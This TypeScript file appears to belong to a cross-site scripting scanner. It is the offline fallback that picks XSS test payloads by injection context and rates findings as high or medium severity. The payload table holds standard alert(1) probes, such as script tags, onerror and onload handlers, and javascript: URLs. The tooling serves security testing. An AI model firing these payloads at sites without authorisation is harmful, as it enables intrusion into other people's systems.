import { BaseAIProvider, type AIResponse, type PayloadSuggestionRequest } from './base-provider.js';

/**
 * Final fallback (tier 5): deterministic rules. Always "available" so the
 * scanner keeps working fully offline with zero AI spend.
 */
export class NoAIProvider extends BaseAIProvider {
  readonly name = 'rule-based';

  isAvailable(): boolean {
    return true;
  }

  suggestPayloads(req: PayloadSuggestionRequest): Promise<{ payloads: string[]; tokensUsed: number }> {
    const byContext: Record<string, string[]> = {
      'html-body': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>'],
      'html-attribute': ['" onfocus=alert(1) autofocus "', '"><img src=x onerror=alert(1)>'],
      'html-attribute-unquoted': ['x onfocus=alert(1) autofocus', 'x><svg onload=alert(1)>'],
      'javascript-string': ["';alert(1)//", "x';alert(1);//", '</script><svg onload=alert(1)>'],
      'javascript-code': [';alert(1);//', '</script><img src=x onerror=alert(1)>'],
      url: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
      css: ['expression(alert(1))', 'url(javascript:alert(1))'],
      svg: ['<svg><script>alert(1)</script></svg>', '<svg><animate onbegin=alert(1)>'],
      unknown: ['<svg onload=alert(1)>', '"><script>alert(1)</script>'],
    };
    const list = byContext[req.context] ?? byContext['unknown']!;
    // De-prioritize anything already tried.
    const fresh = list.filter((p) => !req.failedPayloads.includes(p));
    return Promise.resolve({ payloads: fresh.slice(0, req.max ?? 8), tokensUsed: 0 });
  }

  classifyVuln(input: { context: string; payload: string; url: string; parameter: string }) {
    const highContexts = new Set(['html-body', 'javascript-code', 'svg']);
    return Promise.resolve({
      result: {
        severity: highContexts.has(input.context) ? ('high' as const) : ('medium' as const),
        reasoning: `Rule-based: payload executes in ${input.context} context.`,
        description: `Cross-site scripting via the "${input.parameter}" parameter at ${input.url}. Payload executes in ${input.context} context.`,
      },
      tokensUsed: 0,
    });
  }

  analyze(prompt: string): Promise<AIResponse> {
    return Promise.resolve({
      text: `AI unavailable. Heuristic summary unavailable for: ${prompt.slice(0, 80)}…`,
      tokensUsed: 0,
      provider: this.name,
    });
  }
}
